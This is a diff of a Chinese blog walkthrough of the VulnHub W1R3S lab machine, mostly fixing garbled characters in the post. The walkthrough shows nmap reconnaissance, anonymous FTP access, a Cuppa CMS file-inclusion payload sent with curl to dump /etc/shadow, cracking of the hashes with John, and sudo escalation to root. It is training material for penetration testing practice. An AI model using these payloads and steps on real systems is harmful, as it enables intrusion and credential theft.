@@ -1,13 +1,13 @@
-﻿---
+---
 title: vulnhub靶机--W1R3S-1.0.1
 categories: 靶机系列
 ---
 
-## 一.主机发现和信息收�?
+## 一.主机发现和信息收集
 
 ```Shell
-╭─ /home/kali/Desktop ························································································································· х INT with root@kali at 21:08:18 ─�?
-╰─�?nmap -sT --min-rate 10000 -p- 192.168.0.101 -oA ports.nmap                                                                                                                   ─�?
+╭─ /home/kali/Desktop ························································································································· х INT with root@kali at 21:08:18 ─╮
+╰─❯ nmap -sT --min-rate 10000 -p- 192.168.0.101 -oA ports.nmap                                                                                                                   ─╯
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-25 21:25 EDT
 Nmap scan report for 192.168.0.101
 Host is up (0.0013s latency).
@@ -24,13 +24,13 @@ Nmap done: 1 IP address (1 host up) scanned in 12.55 seconds
 
 可以看到开放了21,22,80,3306端口
 
--sT 用于更加隐蔽的探测服务器，一些防火墙会检测不完整的TCP连接，所以加�?sT 可以更好绕过
+-sT 用于更加隐蔽的探测服务器，一些防火墙会检测不完整的TCP连接，所以加上-sT 可以更好绕过
 
 ---
 
---min-rate 10000 是扫描速率，大部分情况下，都使用该速度，但是在护网行动中，需要更�?
+--min-rate 10000 是扫描速率，大部分情况下，都使用该速度，但是在护网行动中，需要更慢
 
--p- 扫描1-655535个端�?
+-p- 扫描1-655535个端口
 
 
 
@@ -44,17 +44,17 @@ Nmap done: 1 IP address (1 host up) scanned in 12.55 seconds
 
 
 
-阶段�?�?深度探测 先将cat ports.nmap  | grep "open" | awk -F '/'  '{print $1}' | paste -sd ','  的结果保存为变量a �?
+阶段二 ： 深度探测 先将cat ports.nmap  | grep "open" | awk -F '/'  '{print $1}' | paste -sd ','  的结果保存为变量a ：
 
 ```Shell
 a=$(cat ports.nmap  | grep "open" | awk -F '/'  '{print $1}' | paste -sd ',' )
 ```
 
-基于已有端口进行深度探测 �?
+基于已有端口进行深度探测 ，
 
 ```Shell
-╭─ /home/kali/Desktop ························································································································· х INT with root@kali at 22:40:51 ─�?
-╰─�?nmap -sT -sV -sC -O -p $a 192.168.0.101                                                                                                                                      ─�?
+╭─ /home/kali/Desktop ························································································································· х INT with root@kali at 22:40:51 ─╮
+╰─❯ nmap -sT -sV -sC -O -p $a 192.168.0.101                                                                                                                                      ─╯
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-25 22:40 EDT
 Nmap scan report for 192.168.0.101
 Host is up (0.0037s latency).
@@ -99,7 +99,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.19 seconds
 
 ```
 
--sV：扫描漏洞版�?
+-sV：扫描漏洞版本
 
 -sC : 调用nse脚本进行扫描
 
@@ -107,13 +107,13 @@ Nmap done: 1 IP address (1 host up) scanned in 22.19 seconds
 
 -p : 指定端口扫描 
 
-如果不分阶段，直接使�?p- 扫描会触发告警，大大增加暴露的几�?
+如果不分阶段，直接使用-p- 扫描会触发告警，大大增加暴露的几率
 
 下面对UDP服务进行完整信息收集
 
 ```Shell
-╭─ /home/kali/Desktop ······························································································································· with root@kali at 22:57:14 ─�?
-╰─�?nmap -sU --top-port 20 192.168.0.101                                                                                                                                         ─�?
+╭─ /home/kali/Desktop ······························································································································· with root@kali at 22:57:14 ─╮
+╰─❯ nmap -sU --top-port 20 192.168.0.101                                                                                                                                         ─╯
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-25 23:02 EDT
 Nmap scan report for 192.168.0.101
 Host is up (0.0010s latency).
@@ -147,11 +147,11 @@ Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
 
 UDP端口现在是存疑状态，显示open|filtered 
 
-进一步使�?--script进行基础的漏洞扫描：
+进一步使用 --script进行基础的漏洞扫描：
 
 ```Shell
-╭─ /home/kali/Desktop ······························································································································· with root@kali at 23:05:51 ─�?
-╰─�?nmap --script=vuln -p21,80,22,3306   192.168.0.101                                                                                                                           ─�?
+╭─ /home/kali/Desktop ······························································································································· with root@kali at 23:05:51 ─╮
+╰─❯ nmap --script=vuln -p21,80,22,3306   192.168.0.101                                                                                                                           ─╯
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-25 23:06 EDT
 Stats: 0:02:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
 NSE Timing: About 99.21% done; ETC: 23:09 (0:00:01 remaining)
@@ -194,33 +194,33 @@ Nmap done: 1 IP address (1 host up) scanned in 321.54 seconds
 
 2.不存在DOM XSS 以及其他xss
 
-3.存在一个CVE漏洞，但是是DOS，一般不考虑DOS 因为没有太大的价�?
+3.存在一个CVE漏洞，但是是DOS，一般不考虑DOS 因为没有太大的价值
 
 4.确定网站的站点是wordpress站点
 
 
 
-如果在实战中找不到攻击面，可以对ipv6地址再次进行信息收集，深度测�?
+如果在实战中找不到攻击面，可以对ipv6地址再次进行信息收集，深度测试
 
 ### 优先级确定：
 
 现在根据-sC的扫描结果确定渗透测试的优先级：
 
-1.ftp服务下存在敏感信息泄�?优先查看ftp服务
+1.ftp服务下存在敏感信息泄露,优先查看ftp服务
 
 2.3306端口，可能存在弱口令攻击
 
-3.80端口存在web服务，先看看ftp �?306能给我们什么信�?
+3.80端口存在web服务，先看看ftp 和3306能给我们什么信息
 
 4.ssh ssh的权重一般排在末尾，优先不考虑ssh
 
-## �?渗透测试阶段：
+## 二.渗透测试阶段：
 
 根据nmap的扫描结果可以得知，ftp服务存在匿名登录，我们接下来对其进行尝试
 
 ```Shell
-╭─ /home/kali/Desktop/RedTeamNote ························ with root@kali at 23:39:40 ─�?
-╰─�?ftp 192.168.0.101                                                                 ─�?
+╭─ /home/kali/Desktop/RedTeamNote ························ with root@kali at 23:39:40 ─╮
+╰─❯ ftp 192.168.0.101                                                                 ─╯
 Connected to 192.168.0.101.
 220 Welcome to W1R3S.inc FTP service.
 Name (192.168.0.101:kali): anonymous
@@ -241,15 +241,15 @@ drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
 ftp> 
 ```
 
-我们输入prompt关闭交互式提示，这样后续的下载文件操作就不需要手动测�?
+我们输入prompt关闭交互式提示，这样后续的下载文件操作就不需要手动测试
 
-再次输入binary，这样的好处是假如ftp下存在二进制文件，就可以完整将其下载下来，而不会损�?
+再次输入binary，这样的好处是假如ftp下存在二进制文件，就可以完整将其下载下来，而不会损坏
 
 依次cd 进文件夹，使用get *.txt 将所有文件都下载下来
 
 ```Shell
-╭─ /home/kali/Desktop/RedTeamNote ························ with root@kali at 03:41:45 ─�?
-╰─�?cat *.txt                                                                         ─�?
+╭─ /home/kali/Desktop/RedTeamNote ························ with root@kali at 03:41:45 ─╮
+╰─❯ cat *.txt                                                                         ─╯
 New FTP Server For W1R3S.inc
 #
 #
@@ -296,11 +296,11 @@ Rico.D - Human Resources
 
 ```
 
-这里有一串md5,为了确保准确，我们可以使用hash-identifier 进行识别�?
+这里有一串md5,为了确保准确，我们可以使用hash-identifier 进行识别：
 
 ```Shell
-╭─ /home/kali/Desktop/RedTeamNote ·················· х INT with root@kali at 03:50:21 ─�?
-╰─�?hash-identifier 01ec2d8fc11c493b25029fb1f47f39ce                                  ─�?
+╭─ /home/kali/Desktop/RedTeamNote ·················· х INT with root@kali at 03:50:21 ─╮
+╰─❯ hash-identifier 01ec2d8fc11c493b25029fb1f47f39ce                                  ─╯
    #########################################################################
    #     __  __                     __           ______    _____           #
    #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
@@ -368,7 +368,7 @@ Least Possible Hashs:
 
 我们将这串md5丢进在线网站解开
 
-{% asset_img image.png %}
+{% asset_img image.png image.png %}
 
 发现什么都没有
 
@@ -377,8 +377,8 @@ SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
 将这段base64也进行decode
 
 ```Shell
-╭─ /home/kali/Desktop/RedTeamNote ························ with root@kali at 04:07:25 ─�?
-╰─�?echo "SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==" | base64 -d                   ─�?
+╭─ /home/kali/Desktop/RedTeamNote ························ with root@kali at 04:07:25 ─╮
+╰─❯ echo "SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==" | base64 -d                   ─╯
 It is easy, but not that easy..# 
 ```
 
@@ -393,11 +393,11 @@ Gina.L - Inventory
 Rico.D - Human Resources
 ```
 
-对于这些名单，我们一定要敏感，不论有没有�?
+对于这些名单，我们一定要敏感，不论有没有用
 
-Naomi.W 的身份是经理，那么他可能会有人员的敏感信�?
+Naomi.W 的身份是经理，那么他可能会有人员的敏感信息
 
-Hector.A 是IT 部门的主管，可能有系统的最高权�?
+Hector.A 是IT 部门的主管，可能有系统的最高权限
 
 Albert.O和Gina.L 没有太大用处
 
@@ -409,11 +409,11 @@ Rico.D 是人力资源，手上可能有全部人员的信息
 
 mysql -uroot -h 192.168.0.101 -p
 
-尝试是否为空密码�?
+尝试是否为空密码：
 
 ```Shell
-╭─ /home/kali/Desktop/wallpaper ···················································································································································· with root@kali at 06:46:49 ─�?
-╰─�?mysql -uroot -h 192.168.0.101 -p                                                                                                                                                                            ─�?
+╭─ /home/kali/Desktop/wallpaper ···················································································································································· with root@kali at 06:46:49 ─╮
+╰─❯ mysql -uroot -h 192.168.0.101 -p                                                                                                                                                                            ─╯
 Enter password: 
 ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.0.110' is not allowed to connect to this MySQL server
 
@@ -421,15 +421,15 @@ ERROR 2002 (HY000): Received error packet before completion of TLS handshake. Th
 
 可以看到不为空密码，此路不通，我们换成Web服务进行渗透：
 
-打开web页面�?
+打开web页面：
 
-{% asset_img image_1.png %}
+{% asset_img image_1.png image.png %}
 
 在实战中有时候apache页面会隐藏一些信息：
 
 ctrl+u 查看页面源码注释
 
-{% asset_img image_2.png %}
+{% asset_img image_2.png image.png %}
 
 发现并没有可利用信息
 
@@ -437,11 +437,11 @@ ctrl+u 查看页面源码注释
 
 /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 
-确保准确性，实战中需要根据实际情况进行调�?
+确保准确性，实战中需要根据实际情况进行调整
 
 ```Shell
 ╭─ /home/kali/Desktop ··················································································································· with
-╰─�?gobuster dir -u "http://192.168.0.109/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt              
+╰─❯ gobuster dir -u "http://192.168.0.109/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt              
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -466,14 +466,14 @@ Finished
 ===============================================================
 ```
 
-发现开放了/javascript /wordpress  /administrator /server-status 页面，我们访问worldpress目录时会发现跳转到localhost上，此时 我们尝试修改/etc/hosts文件，将localhost 指向 靶机ip尝试是否可以利用这点访问靶机�?worldpress页面
+发现开放了/javascript /wordpress  /administrator /server-status 页面，我们访问worldpress目录时会发现跳转到localhost上，此时 我们尝试修改/etc/hosts文件，将localhost 指向 靶机ip尝试是否可以利用这点访问靶机的/worldpress页面
 
 ```Shell
-╭─ /home/kali/Desktop ························································································· with root@kali at 01:58:00 ─�?
-╰─�?vi /etc/hosts                                                                                                                          ─�?
+╭─ /home/kali/Desktop ························································································· with root@kali at 01:58:00 ─╮
+╰─❯ vi /etc/hosts                                                                                                                          ─╯
 
-╭─ /home/kali/Desktop ················································································ took 20s with root@kali at 01:58:38 ─�?
-╰─�?cat /etc/hosts                                                                                                                         ─�?
+╭─ /home/kali/Desktop ················································································ took 20s with root@kali at 01:58:38 ─╮
+╰─❯ cat /etc/hosts                                                                                                                         ─╯
 192.168.0.109   localhost
 127.0.1.1       kali
 ::1             localhost ip6-localhost ip6-loopback
@@ -493,39 +493,39 @@ ff02::2         ip6-allrouters
 
 
 
- 还是不行�?
+ 还是不行：
 
-{% asset_img image_3.png %}
+{% asset_img image_3.png image.png %}
 
 我们需要深度调整kali，现在，这个思路靠后，再尝试其他思路
 
 观察http://192.168.0.109/administrator/installation/的信息：
 
-打开网站�?
+打开网站：
 
-{% asset_img image_4.png %}
+{% asset_img image_4.png image.png %}
 
 标题是coppa cms(这是一个重要的信息，泄露了网站的CMS) 观察页面，是一个数据库安装页面，在渗透测试的过程中，遇到此类情况心中需要有预期（服务中止，或者被管理员发现），绿色的字告诉我们可以执行安装，经过充分的风险评估后，点击下一步，如果安装成功，可能会给我一个可以登录的后台，届时，就可以进行反向shell的操作获取目标主机的权限
 
-{% asset_img image_5.png %}
+{% asset_img image_5.png image.png %}
 
 点击问号，这里有一些小tips，看了一下，没有有价值的信息，下面重装数据库
 
-{% asset_img image_6.png %}
+{% asset_img image_6.png image.png %}
 
 可以看到文件和表格都已经能编辑成功，唯一出现问题的就是管理员的用户未创建
 
 这个页面我们可以查看源码
 
-{% asset_img image_7.png %}
+{% asset_img image_7.png image.png %}
 
 没有敏感信息，截至目前，web渗透我们只获取到了一个可用信息：该站点的CMS为coppa CMS
 
-既然是CMS 那就很有可能存在公开漏洞，下面使用searchsploit 来检索本地漏洞库 看看有没有这个cms的相关漏�?
+既然是CMS 那就很有可能存在公开漏洞，下面使用searchsploit 来检索本地漏洞库 看看有没有这个cms的相关漏洞
 
 ```Shell
-╭─ /home/kali/Desktop ·································· with root@kali at 11:56:28 ─�?
-╰─�?searchsploit Cuppa CMS                                                          ─�?
+╭─ /home/kali/Desktop ·································· with root@kali at 11:56:28 ─╮
+╰─❯ searchsploit Cuppa CMS                                                          ─╯
 ----------------------------------------------------- ---------------------------------
  Exploit Title                                       |  Path
 ----------------------------------------------------- ---------------------------------
@@ -539,15 +539,15 @@ Papers: No Results
 locate 定位文件位置 或者利用searchsploit -m mirror 25971
 
 ```Shell
-╭─ /home/kali/Desktop ·································· with root@kali at 11:56:33 ─�?
-╰─�?locate php/webapps/25971.txt                                                    ─�?
+╭─ /home/kali/Desktop ·································· with root@kali at 11:56:33 ─╮
+╰─❯ locate php/webapps/25971.txt                                                    ─╯
 /usr/share/exploitdb/exploits/php/webapps/25971.txt
 
-╭─ /home/kali/Desktop ·································· with root@kali at 11:58:12 ─�?
-╰─�?cat                                                                             ─�?
+╭─ /home/kali/Desktop ·································· with root@kali at 11:58:12 ─╮
+╰─❯ cat                                                                             ─╯
 
-╭─ /home/kali/Desktop ···························· х INT with root@kali at 11:58:17 ─�?
-╰─�?cat /usr/share/exploitdb/exploits/php/webapps/25971.txt                         ─�?
+╭─ /home/kali/Desktop ···························· х INT with root@kali at 11:58:17 ─╮
+╰─❯ cat /usr/share/exploitdb/exploits/php/webapps/25971.txt                         ─╯
 # Exploit Title   : Cuppa CMS File Inclusion
 # Date            : 4 June 2013
 # Exploit Author  : CWH Underground
@@ -641,55 +641,55 @@ Able to read sensitive information via File Inclusion (PHP Stream)
 
 1. Cuppa CMS File Inclusion 该漏洞是文件包含漏洞
 
-2. 披露时间�?013年的四月四日
+2. 披露时间是2013年的四月四日
 
-3. 不论是windows还是linux都能成功利用该漏�?
+3. 不论是windows还是linux都能成功利用该漏洞
 
-该漏洞产生的原因�?/alerts/alertConfigField.php �?2行存�?<?php include($_REQUEST["urlConfig"]); ?> include可以包含任意文件 �?urlConfig参数可控
+该漏洞产生的原因是 /alerts/alertConfigField.php 的22行存在 <?php include($_REQUEST["urlConfig"]); ?> include可以包含任意文件 且 urlConfig参数可控
 
 该漏洞不仅可以读取本地文件，还能包含远程文件 
 
 ```Shell
-攻击者可能利用此漏洞包含本地或远程的PHP文件，或读取非PHP文件。在生成将被包含到当前文件中的文件名时，使用了用户可篡改的数据。该文件中的PHP代码将被执行，而非PHP代码则会嵌入到输出中。此漏洞可能导致服务器完全被攻陷�?
+攻击者可能利用此漏洞包含本地或远程的PHP文件，或读取非PHP文件。在生成将被包含到当前文件中的文件名时，使用了用户可篡改的数据。该文件中的PHP代码将被执行，而非PHP代码则会嵌入到输出中。此漏洞可能导致服务器完全被攻陷。
 ```
 
-下面进行漏洞利用�?
+下面进行漏洞利用：
 
-访问�?
+访问：
 
 ```Shell
 http://192.168.0.113/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 ```
 
-{% asset_img image_8.png %}
+{% asset_img image_8.png image.png %}
 
 访问http://192.168.0.114/cuppa 
 
-猜测安装cms时，根不一定为cuppa，而是administrator ,将路径替�?
+猜测安装cms时，根不一定为cuppa，而是administrator ,将路径替换:
 
 ```Shell
 http://192.168.0.113/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 ```
 
-{% asset_img image_9.png %}
+{% asset_img image_9.png image.png %}
 
 发现没有任何回显，查看源码看看：
 
 
-{% asset_img image_10.png %}
+{% asset_img image_10.png image.png %}
 
-也是空的，猜测程序后端处理逻辑不一样，或者版本更新，这里我们选择去cuppa cms官网进行代码审计�?
+也是空的，猜测程序后端处理逻辑不一样，或者版本更新，这里我们选择去cuppa cms官网进行代码审计：
 
 [github.com](https://github.com/CuppaCMS/CuppaCMS/blob/master/alerts/alertConfigField.php)
 
 
-{% asset_img image_11.png %}
+{% asset_img image_11.png image.png %}
 
-发现了是使用POST 进行了传参，为了规范我们使用curl发包�?
+发现了是使用POST 进行了传参，为了规范我们使用curl发包：
 
 ```Shell
-╭─ /home/kali/Desktop ·································· with root@kali at 12:35:12 ─�?
-╰─�?curl -h all | grep "url"                                                        ─�?
+╭─ /home/kali/Desktop ·································· with root@kali at 12:35:12 ─╮
+╰─❯ curl -h all | grep "url"                                                        ─╯
      --data-urlencode <data>               HTTP POST data URL encoded
  -q, --disable                             Disable .curlrc
      --disallow-username-in-url            Disallow username in URL
@@ -701,11 +701,11 @@ http://192.168.0.113/administrator/alerts/alertConfigField.php?urlConfig=../../.
 
 ```
 
-查看第一个，--data-urlencode 进行url编码 并发送POST数据�?
+查看第一个，--data-urlencode 进行url编码 并发送POST数据包
 
 ```Shell
-╭─ /home/kali/Desktop ·································· with root@kali at 12:36:49 ─�?
-╰─�?curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.0.113/administrator/alerts/alertConfigField.php 
+╭─ /home/kali/Desktop ·································· with root@kali at 12:36:49 ─╮
+╰─❯ curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.0.113/administrator/alerts/alertConfigField.php 
 <style>
     .new_content{
         position: fixed;
@@ -826,8 +826,8 @@ mysql:!:17554:0:99999:7:::
 成功获取到shadow数据，下面将三个有hash的账号进行john破解，创建shadow.hash 文件 使用john（实际的情况下可能需要赋予john更复杂的参数）下面直接测试：
 
 ```Shell
-╭─ /home/kali/Desktop ························· took 15s with root@kali at 12:48:15 ─�?
-╰─�?cat shadow.hash;john shadow.hash                                                ─�?
+╭─ /home/kali/Desktop ························· took 15s with root@kali at 12:48:15 ─╮
+╰─❯ cat shadow.hash;john shadow.hash                                                ─╯
 www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
 
 
@@ -850,26 +850,26 @@ Proceeding with incremental:ASCII
 
 ```
 
-由于已经通关靶机 所以显示两个密码已经破�?
+由于已经通关靶机 所以显示两个密码已经破解
 
 ```Shell
 john --show 你的哈希文件
-╭─ /home/kali/Desktop ·································· with root@kali at 12:50:09 ─�?
-╰─�?john --show shadow.hash                                                         ─�?
+╭─ /home/kali/Desktop ·································· with root@kali at 12:50:09 ─╮
+╰─❯ john --show shadow.hash                                                         ─╯
 www-data:www-data:17560:0:99999:7:::
 w1r3s:computer:17567:0:99999:7:::
 
 2 password hashes cracked, 1 left
 
-╭─ /home/kali/Desktop ·································· with root@kali at 12:50:17 ─�?
-╰─�?                        
+╭─ /home/kali/Desktop ·································· with root@kali at 12:50:17 ─╮
+╰─❯                         
 ```
 
 尝试w1r3s:computer登录 
 
 ```Shell
-╭─ /home/kali/Desktop ··························· with root@kali at 12:51:50 ─�?
-╰─�?ssh w1r3s@192.168.0.113                                                  ─�?
+╭─ /home/kali/Desktop ··························· with root@kali at 12:51:50 ─╮
+╰─❯ ssh w1r3s@192.168.0.113                                                  ─╯
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
@@ -896,9 +896,9 @@ Last login: Wed May 27 09:51:13 2026 from 192.168.0.114
 
 ```
 
-### �?权限提升
+### 三.权限提升
 
-id查看所属组�?
+id查看所属组：
 
 ```Shell
 -bash-4.3$ id
@@ -940,7 +940,7 @@ User w1r3s may run the following commands on W1R3S:
 
 ```
 
-`(ALL : ALL) ALL` 表示：用�?`w1r3s` **可以以任何用户的身份执行任何命令**（等同于 root 权限�?
+`(ALL : ALL) ALL` 表示：用户 `w1r3s` **可以以任何用户的身份执行任何命令**（等同于 root 权限）
 
 sudo /bin/bash 
 
@@ -948,7 +948,7 @@ sudo su
 
 sudo u+s /bin/bash;bash -p 
 
-这三个命令都能进行权限提�?我们选用第一�?
+这三个命令都能进行权限提升,我们选用第一个
 
 ```Shell
 -bash: computer: command not found
@@ -1005,13 +1005,13 @@ root@W1R3S:/root#
 
 ```
 
-### �?总结
+### 四.总结
 
-在信息收集阶段，使用nmap进行阶段性探测。首先进行TCP全端口扫描（nmap -p-）识别开放端口，并通过-sV参数进行版本探测�?sC参数调用默认安全脚本。同时强调不能忽略UDP端口扫描（nmap -sU），因为某些服务如SNMP、DNS、TFTP可能存在于UDP上，成为被忽视的入侵路径。此外，从技术讨论的角度来看，IPv6探测�?6参数）也值得关注，部分主机在IPv6配置上可能存在访问控制遗漏，从而绕过IPv4层面的防御，不过在本靶机实战中未实际执行这一步�?
+在信息收集阶段，使用nmap进行阶段性探测。首先进行TCP全端口扫描（nmap -p-）识别开放端口，并通过-sV参数进行版本探测，-sC参数调用默认安全脚本。同时强调不能忽略UDP端口扫描（nmap -sU），因为某些服务如SNMP、DNS、TFTP可能存在于UDP上，成为被忽视的入侵路径。此外，从技术讨论的角度来看，IPv6探测（-6参数）也值得关注，部分主机在IPv6配置上可能存在访问控制遗漏，从而绕过IPv4层面的防御，不过在本靶机实战中未实际执行这一步。
 
-根据端口扫描结果，按服务类型制定渗透测试的目标策略。首先尝试匿名登录FTP服务，成功获取若干文本文件，对这些文件进行解码与破译，获得部分敏感信息。接着查看MySQL端口�?306/tcp），测试弱口令及已收集凭据，未发现明显漏洞�?
+根据端口扫描结果，按服务类型制定渗透测试的目标策略。首先尝试匿名登录FTP服务，成功获取若干文本文件，对这些文件进行解码与破译，获得部分敏感信息。接着查看MySQL端口（3306/tcp），测试弱口令及已收集凭据，未发现明显漏洞。
 
-随后对Web服务进行渗透测试。使用目录扫描工具发现两个重要目录：/wordpress �?/administrator。由�?wordpress的路径配置问题，未能成功利用。通过/administrator目录的页面标题识别出网站使用Cuppa CMS搭建，查询离线漏洞数据库找到该CMS的历史原始漏洞，但尝试利用未成功�?
+随后对Web服务进行渗透测试。使用目录扫描工具发现两个重要目录：/wordpress 和 /administrator。由于/wordpress的路径配置问题，未能成功利用。通过/administrator目录的页面标题识别出网站使用Cuppa CMS搭建，查询离线漏洞数据库找到该CMS的历史原始漏洞，但尝试利用未成功。
 
 在此基础上对CMS进行进一步信息收集，获取新版本的源码进行分析，发现系统使用POST请求方式进行文件包含操作。利用该文件包含漏洞读取/etc/shadow文件，提取系统用户密码哈希。使用John the Ripper对哈希进行离线破解，成功获取明文密码。最后通过sudo提权，获得root权限并拿下flag
 
